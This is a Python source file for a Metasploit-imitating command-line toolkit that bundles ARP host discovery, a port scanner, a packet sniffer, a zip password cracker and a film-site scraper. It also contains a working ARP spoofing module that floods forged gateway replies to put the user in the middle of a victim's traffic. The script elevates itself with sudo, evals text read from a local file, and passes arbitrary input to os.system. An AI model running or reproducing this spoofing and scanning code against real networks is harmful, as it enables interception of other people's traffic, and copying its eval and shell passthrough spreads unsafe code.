#! /usr/bin/python3
# -*- coding: utf-8 -*-

# 权限检查
import os
import sys
#import glob

tmp_packet = sys.path
def permission_check():
    euid = os.geteuid()
    if euid != 0:
        # print("Script not started as root. Running sudo..")
        try:
            with open('os_path.log', 'r', encoding='utf-8') as file:
                pass
        except:
            with open('os_path.log', 'w', encoding='utf-8') as file:
                file.write(str(sys.path))

        args = ['sudo', sys.executable] + sys.argv + [os.environ]
        # sys.stdout.write('程序不是以root权限运行,请使用 [sudo]')
        os.execlpe('sudo', *args)
    else:
        with open('os_path.log', 'r', encoding='utf-8') as file:
            return eval(file.read())


sys.path += permission_check()

sys.stdout.write('Initializing...')
try:
    assert (sys.platform == 'linux')
except ImportionError:
    print('抱歉，此程序暂不兼容Windows/MAC。请切换到Linux环境下运行。')



#sys.path.append('/home/gaints/.local/lib/python3.7/site-packages')
sys.path += tmp_packet

from scapy.all import *
import re
from socket import *
import time
import extract_zip
import threading
import base64
from colorama import Fore, Style
import my_word
import charater_paint as pt
import random
import signal
import requests
import inspect
import prettytable
import random
import crack_douban
# import glob
# dazao xiaomi hetao niunai yinshiqingdan fengmi
# psutil,paramiko,tty,pty,termios,readline,sys,platform,os,scapy,subprocess,socket,Thread,multiprocessing,urllib,queque,wmi,select
# pwd模块读取用户信息
# stat模块操作文件信息
# inspect,ryu,functools,ast,asciibin
# 必须以root权限运行，root用户状态下的库目录没有非标准库
# 输入校验
def input_ip(t):
    # ip = input('请输入待探测的IP或网段:')
    ip = t[0]
    pat_single_ip = r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{0,3}\.[0-9]{1,3}'
    pat_other_ip = r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{0,3}\.0/24'
    if re.match(pat_single_ip, ip):
        result = re.match(pat_single_ip, ip).string
    elif re.match(pat_other_ip, ip):
        result = re.match(pat_other_ip, ip).string
    if '24' in result:
        return result, 'other'
    else:
        return result, 'single'






# 主机发现功能定义
class HostScanner():
    def __init__(self, target):
        self.target = target
        self.up_list = []
        # self.threads = []

    # 单个ip地址
    def execute_single_ip(self):
        script_name = os.path.basename(sys.argv[0]).split(".")[0].rstrip('.py')
        pkt = ARP(pdst=self.target)
        num = 1
        """
        #ping 扫描
        ip_id = random.randint(1, 65535)
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        packet = IP(dst=self.target, ttl=64, id=ip_id) / ICMP(id=icmp_id, seq=icmp_seq) / b''#构建ICMP包
        #ping_pkt = sr1(packet, timeout=2, verbose=False)#发送
        """
        try:
            while True:
                re_pkt = sr1(pkt, timeout=1, verbose=False)

                if re_pkt :
                    print(script_name.capitalize() + ' scan report for ' + self.target + '\n' + 'Host is up.\n' + 'MAC Address: ' + re_pkt.hwsrc)
                    #可使用ICMP和ARP多种扫描方式探测
                    break
                elif num == 2:
                    raise AttributeError
                elif not re_pkt:
                    num += 1
                    continue

        except:
            a = my_word.UseStyle('-', fore='red')
            print('[{}]'.format(a) + self.target + ": " + "该主机并未在线.")

    # 地址段
    def execute_other_ip(self, addr: str, a: int):
        pkt = ARP(pdst=addr + str(a))
        a = my_word.UseStyle('*',fore='green')
        num = 1
        try:
            while True:
                re_pkt = sr1(pkt, timeout=1, verbose=False)  # verbose参数是关闭回显
                if re_pkt:
                    self.up_list.append("[{}] {:<20}".format(a,re_pkt.psrc) + "  mac: " + re_pkt.hwsrc)  # 将在线主机添加至列表
                    break
                elif num == 2:
                    raise AttributeError
                elif not re_pkt:
                    num += 1
                    continue
        except:
            pass
        finally:
            pass

    def output_alive_ip(self):
        for i in self.up_list:  # 遍历打印
            print(i)
        if not self.up_list:
            a = my_word.UseStyle('-', fore='red')
            print('[%s] 该网段尚未有主机在线.' % a)


# 主机发现执行函数
def run_hostdiscovery(arg):
    threads = []
    arg = input_ip(arg)
    a = time.localtime()
    script_name = os.path.basename(sys.argv[0]).split(".")[0].rstrip('.py')
    print('Starting ' + script_name +' at ' + time.strftime('%Y-%m-%d %H:%M:%S',a))
    if arg[1] == 'single':
        obj = HostScanner(arg[0])
        time.sleep(1)
        obj.execute_single_ip()
    if arg[1] == 'other':
        obj = HostScanner(arg[0])
        tg = '.'.join(arg[0].split('.')[0:3]) + '.'  # 从接收的地址段中得出地址列表
        for i in range(1, 255):
            t = threading.Thread(target=obj.execute_other_ip, args=(tg, i))
            threads.append(t)
            t.start()
        for j in threads:
            j.join()
        obj.output_alive_ip()


# 端口扫描


# 输入校验
def input_target():
    target = input('please input target IP: ')
    pat_single_ip = r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{0,3}\.[0-9]{1,3}'  # 正则
    if re.match(pat_single_ip, target):
        result = re.match(pat_single_ip, target).string
        # print(re.match(pat_single_ip, ip).string)
        return result


# 端口扫描功能定义
screenlock = threading.Semaphore(value=25)


class Port_Scanner():
    """
    :利用sock模块中的connect_ex函数确定端口是否开放
    :对应端口若开放，则connect_ex函数返回0
    :采用多线程
    """

    def __init__(self, target):
        self.target = target[0]
        self.threads = []
        self.open_port = []

    # 扫描
    def Scanner(self, host, port):
        try:
            soc = socket(AF_INET, SOCK_STREAM)
            result = soc.connect_ex((host, port))  # 若成功连接
            screenlock.acquire()
            if result == 0:
                # print('[+]%d tcp open' % port)
                self.open_port.append(port)
                soc.close()
        except:
            screenlock.acquire()
        finally:
            screenlock.release()
            soc.close()

    def excute_port_scan(self, func_name):

        for i in range(1, 1000):
            t = threading.Thread(target=func_name, args=(self.target, int(i)))
            self.threads.append(t)
            t.start()
        for j in self.threads:
            j.join()

    # 输出
    def output_port(self, arg):
        # print('PORT', ' ' * 3, 'STATUS')
        a = my_word.UseStyle('+',fore='green')
        if arg:
            for i in arg:
                print('[%s] %d tcp open' % (a,i))
        else:
            print(Fore.RED + '抱歉，尚未在目标主机上发现开放端口.', Style.RESET_ALL)


# 端口扫描执行函数
def run_port_scanner(target):
    # target = input_target()
    handle = Port_Scanner(target)
    handle.excute_port_scan(handle.Scanner)
    print('Scanning...')
    time.sleep(1)
    handle.output_port(handle.open_port)


# 嗅探抓包
def echo_fuc(pack):  # 回调函数
    print(pack.sprintf("IP:%IP.src% -> %IP.dst%"))

status = 0
def run_module_sniff(arg):
    # net_interface = input('请指定网卡: ')
    net_interface = arg[0]
    # fil = input('类型:')
    fil = '' if arg[-1] == '*' else arg[-1]
    print('\ntips:', ' 按ctrl + c终止抓包')
    print('capturing...')
    time.sleep(1.4)
    # prn=echo_fuc,
    def stopfilter(pkt):
        if status == 0:
            return False
        elif status == 1:
            return True
    pkt = sniff(iface=net_interface, filter=fil,
                timeout=int(60),stop_filter=stopfilter)  # sniff模块使用了signal模块接收ctrl+c停止抓包
    print('\n', pkt)
    print(pkt.show())  # 抓包结束后打印每个包的简略信息
    check_wr = input('\n是否保存数据包到文件？')
    # print(dir(pkt))
    if check_wr in ['y', 'Y']:
        file_name = input('请输入文件名: ')
        try:
            wrpcap(file_name + '.pcap', pkt)
        except:
            print(Fore.RED + '保存出错，请重试.', Style.RESET_ALL)
        finally:
            print('奥利给，保存成功.')








class spoof():
    def __init__(self, target, gateway):
        self.target = target
        self.gateway = gateway
        self.gateway_mac = getmacbyip(self.gateway)
        self.self_mac = ARP().hwsrc
        self.target_mac = getmacbyip(self.target)



    def arp_send(self):

        pkt = Ether(src=self.self_mac, dst=self.target_mac) / ARP(hwsrc=self.self_mac, psrc=self.gateway, hwdst=self.target_mac,
                                        pdst=self.target, op=2)
        try:
            print("Start spoofing...")
            while True:
                sendp(pkt, verbose=False)
        except:
            self.handler()
    def handler(self):
        print("\nStart clean...")
        pkt = Ether(src=self.self_mac, dst=self.target_mac) / ARP(hwsrc=self.gateway_mac, psrc=self.gateway, hwdst=self.target_mac,
                                                        pdst=self.target, op=2)
        i = 1

        while True:
            if i == 50:
                break
            sendp(pkt, verbose=False)
            i += 1
            time.sleep(0.05)


#arpspoof执行函数
tmp_fuc = None
def run_arpspoof(arg):
    a,b = arg[0],arg[1]
    obj = spoof(a,b)
    obj.arp_send()
    global tmp_fuc
    tmp_fuc = obj.handler


def qq():
    pass





def sp_douban(arg):
    print('Wait a moment...')
    f = arg[0]
    abstract, abstract_2, next_url, score = crack_douban.get_htm(f)

    duanpin = crack_douban.get_flag(next_url)

    direct = abstract_2.split('/')[0].strip()
    duration = abstract.split('/')[-1].strip()


    print('\n[{}]：{}\n'.format(my_word.UseStyle('片名', fore='green'), f))
    print('[{}]：{}\n'.format(my_word.UseStyle('评分', fore='green'), score))
    print('[{}]：{}\n'.format(my_word.UseStyle('导演', fore='green'), direct))
    print(
        '[{}]：{}\n'.format(my_word.UseStyle('主演', fore='green'), '|'.join(abstract_2.split('/')[1:])).replace(' ', ''))
    print('[{}]：{}\n'.format(my_word.UseStyle('时长', fore='green'), duration))

    print('[{}]：{}'.format(my_word.UseStyle('剧情简介', fore='green'), duanpin.replace(' ', '')))








from cmd import Cmd



class Cli(Cmd):
    func_list = {'port_scan': run_port_scanner,
                 'host_discovery': run_hostdiscovery,
                 'sniff': run_module_sniff,
                 'spider': sp_douban,
                 'crack':extract_zip.extract_zip,
                 'spoof': run_arpspoof
                 }
    func_args = {
        'port_scan': {
            'RHOST': '*'
        },
        'host_discovery': {
            'RHOSTS': '*'
        },
        'sniff': {
            'interface': '*',
            'cap_type': '*'
        },
        'spider': {'film':'*'},
        'spoof': {
            'target': '*',
            'gateway': '*'
        },
        'crack': {
            'filename': '*',
            'pass_list': '*'
        }
    }
    old_prompt = 'msf5'
    prompt = my_word.UseStyle('msf5', mode='underline') + ' > '
    intro = ' ' * 45 + '--Written by lyhmuzi777@qq.com' + my_word.UseStyle('\nLife is short,you need Python.',
                                                                           mode='bold')

    def __init(self):
        Cmd.__init__(self)

    def change_prompt(self, name):
        a = len(name.split('/'))
        if a > 1:
            m_name = my_word.UseStyle(name.split('/')[1], fore='red', mode='bold')
            self.old_prompt = '{} {}({}) > '.format('msf5', name.split('/')[0], name.split('/')[1])
        elif a == 1:
            m_name = my_word.UseStyle(name, fore='red', mode='bold')
            self.old_prompt = '{} {}({}) > '.format('msf5', name, name)
        self.prompt = '{} {}({}) > '.format(my_word.UseStyle('msf5', mode='underline'), name.split('/')[0], m_name)

        # 思路:使用inspect模块获取函数属性

    def pro_replace(self, arg):
        arg = arg.replace('(', '/').replace(')', '/').split('/')
        return arg

    def do_use(self, line):
        if line == 'scanner/host_discovery':
            self.change_prompt(name=line)
        elif line == 'crack':
            self.change_prompt(name=line)
        elif line == 'spoof':
            self.change_prompt(name=line)
        elif line == 'scanner/port_scan':
            self.change_prompt(name=line)
        elif line == 'spider':
            self.change_prompt(name=line)
        elif line == 'sniff':
            self.change_prompt(name=line)
        else:
            print('不知道你要输什么.')

    def do_clear(self, line):
        os.system('clear')

    def do_hello(self, line):
        print(Fore.RED + 'Surprise! Your mom has exploded. hahahaha....', Style.RESET_ALL)

    def do_exit(self, line):
        print('Bye')
        exit(0)

    def do_quit(self, name):
        print('Bye')
        exit(0)

    def emptyline(self):
        # print('[-] Please enter the command.')
        pass

    def do_EOF(self, line):
        print('\nBye')
        exit(0)

    def default(self, line):

        try:
            if 'cd ' in line:
                os.chdir(line.lstrip('cd '))
            else:
                a = os.system(line)
        except:
            print('宁输的剩么东西儿？')

    def do_load(self, line):
        if self.old_prompt == 'msf5':
            a = my_word.UseStyle('-', fore='red')
            print('[%s] Unknown variable.' % a)
        else:
            tmp_pro = self.pro_replace(self.old_prompt)
            if len(tmp_pro) > 1:
                name = tmp_pro[-2]
            else:
                name = tmp_pro[0]
            if name == 'sniff':
                try:
                    self.cap = sniff(offline=line)
                    print(self.cap)
                    self.prompt = '{} {}({}) > '.format(my_word.UseStyle('msf5', mode='underline'), my_word.UseStyle('sniff', fore='red'), line)
                    self.old_prompt = 'load'
                except:
                    print('load failed.')

            else:
                a = my_word.UseStyle('-', fore='red')
                print('[%s] Unknown variable.' % a)

    def do_display(self, line):
        if self.old_prompt == 'load':
            cap = self.cap
            if not line:
                print(cap.show())
            else:
                try:
                    print(cap[int(line)].show())
                except IndexError:
                    print('没有那个packet.')
        else:
            a = my_word.UseStyle('-', fore='red')
            print('[%s] Unknown variable.' % a)



    def do_show(self, line):
        if line == 'modules':
            print('num   name')
            dic = {
                1:'scanner/host_discovery',
                2:'scanner/port_scan',
                3:'crack',
                4:'sniff',
                5:'spider',
                6:'spoof'
            }
            for i in dic:
                print(' {}    {}\n'.format(i,dic[i]))
        elif line == 'options':
            if self.old_prompt == 'msf5':
                a = my_word.UseStyle('-', fore='red')
                print('[%s] Unknown variable.' % a)
            else:
                try:
                    tmp = self.pro_replace(self.old_prompt)[-2]
                    print('name',' ' * 10,'setting')
                    print('----',' ' * 10,'-------')
                    for i in self.func_args[tmp]:
                        print('{:<15}'.format(i), self.func_args[tmp][i])
                except:
                    print('unknown error.')

        elif line == 'documentation':
            print(my_word.UseStyle('None.', fore='red'))
        else:
            a = my_word.UseStyle('-', fore='red')
            print('[{}] Unknown command: {}.'.format(a, line))

    def do_run(self, line):
        if line == 'modules':
            print(my_word.UseStyle('scanner/host_discovery\n/scanner/port_scan\npwd_crack\nspider\nspoof', mode='bold'))
        else:
            tmp_pro = self.pro_replace(self.old_prompt)
            if len(tmp_pro) > 1:
                name = tmp_pro[-2]
            else:
                name = tmp_pro[0]
            a = self.func_list[name]
            q = []
            for i in self.func_args[name]:
                q.append(self.func_args[name][i])
            try:
                a(q)
            except:
                time.sleep(1)
                print('Unknown error, please try again.')

    def do_set(self, line):

        ls = line.split(' ')
        if len(ls) > 1:
            a = ls[-1]
            b = ls[0]
        else:
            b = ls[0]
            a = '*'
        tmp_pro = self.pro_replace(self.old_prompt)
        if len(tmp_pro) > 1:
            name = tmp_pro[-2]
        else:
            name = tmp_pro[0]
        self.func_args[name][b] = a
        print(b + ' ==> ' + a)
        # 思路 使用inspect或者gloabs()动态添加函数并传参调用,show options时应该用inspect动态获取函数的参数并传参

    def do_search(self, line):
        print('I\'m search.')

    def do_back(self, line):
        self.prompt = my_word.UseStyle('msf5', mode='underline') + ' > '
        self.old_prompt = 'msf5'


    def complete_load(self, text, line, begidx, endidx):
        completions = glob('*.pcap')
        return [i for i in completions if i.startswith(text)]

    def complete_use(self, text, line, begidx, endidx):
        if line:
            completions = ['scanner/','sniff','spider','spoof','crack','host_discovery','port_scan']
            if len(line) == 4:
                return ['scanner/','sniff','spider','spoof','crack']
            elif text:
                if line.rstrip(text) == 'use ':
                    completions = ['scanner/','sniff','spider','spoof','crack']
                return [i for i in completions if i.startswith(text)]
            elif not text:
                tmp = line.replace('use ','').rstrip('/')
                if tmp == 'scanner':
                    completions = ['host_discovery','port_scan']
                    return [i for i in completions if i.startswith(text)]
                a = [i for i in completions if i in i.startswith(text)]
                #a.append(tmp)
                return a
        elif not line:
            completions = ['scanner','sniff','spider','spoof','crack']
            return [i + '///' for i in completions]

    def complete_show(self, text, line, begidx, endidx):
        if self.old_prompt == 'msf5':
            completions = ['modules', 'documentation']
            if not text and not line:
                completions = ['modules', 'documentation']
                return [i for i in completions if i.startswith(text)]
            else:
                pass
        else:
            completions = ['options', 'modules']
            if self.old_prompt == 'load':
                completions = ['modules']
            elif not text and not line:
                return completions
        return [i for i in completions if i.startswith(text)]

    def complete_set(self, text, line, begidx, endidx):
        tmp_pro = self.pro_replace(self.old_prompt)
        if len(tmp_pro) > 1:
            name = tmp_pro[-2]
        else:
            name = tmp_pro[0]
        q = []
        for i in self.func_args:
            if i == name:
                for j in self.func_args[i]:
                    q.append(j)
        b = 1 if text in q else 0

        if line:
            if not text:
                for i in q:
                    if i in line:
                        return []
                    elif i not in q:
                        return q
                    else:
                        return []
            elif text:
                if b:
                    completions = []
                    completions.append(text + ' ')
                    # return [i for i in completions if i.startswith(text)]
                    return completions
                completions = q
                return [i for i in completions if i.startswith(text)]

    def completenames(self, text, *ignored):

        a = 1 if self.old_prompt == 'msf5' else 0

        if not text and a:
            return []
        elif not text and not a:
            dotext = 'do_' + text
            if 'sniff' not in self.prompt:
                return [a[3:] for a in self.get_names() if a not in ['do_load','do_display','do_EOF'] and a.startswith(dotext)]
            # return [a[3:] for a in self.get_names() if a.startswith(dotext)]
            return ['qq']
        elif text in [i[3:] for i in self.get_names()]:
            completions = []
            completions.append(text + ' ')
            return completions
        elif text and not a:
            dotext = 'do_' + text
            if 'sniff' not in self.prompt:
                return [a[3:] for a in self.get_names() if a.startswith(dotext) and a not in ['do_load','do_display','do_EOF'] and a.startswith(dotext)]
            else:
                dotext = 'do_' + text
                return [a[3:] for a in self.get_names() if a.startswith(dotext)]
            # return ['nmsl']
        elif a and text:
            dotext = 'do_' + text
            return [a[3:] for a in self.get_names() if a.startswith(dotext) and a not in ['do_set', 'do_EOF','do_load','do_display',
                       'do_run']]


# 字符画随机输出
def op_charater():
    num = random.randint(1, 5)
    cap = 'txt' + str(num)
    return eval('pt.' + cap)


# 信号接收功能
def sig_handler(num, frame):
    global status
    # sys.stdout.write('您选择了中断程序\n')
    # sys.stdout.write('？不准退出\n')
    # sys.stdout.write(cli.prompt)
    # sys.stdout.flush()
    a = inspect.stack()[1][3]
    if a == 'cmdloop':
        sys.stdout.write("Interrupt: use the 'exit' command to quit\n" + cli.prompt)
        sys.stdout.flush()
    elif a == 'select':
        status = 1
    else:
        raise KeyboardInterrupt


def sig_handler2(num, frame):
    print('\nBye')
    exit(0)


signal.signal(signal.SIGINT, sig_handler)
signal.signal(signal.SIGTSTP, sig_handler2)

if __name__ == '__main__':
    # os.system('clear -x')
    sys.stdout.flush()
    char = op_charater()
    time.sleep(2)
    sys.stdout.write('\r' + ' ' * 50)
    print(Fore.RED + char)
    # print(my_word.UseStyle(char,mode='blink'))
    sys.stdout.flush()
    print(Style.RESET_ALL, end='')
    cli = Cli()
    cli.cmdloop()


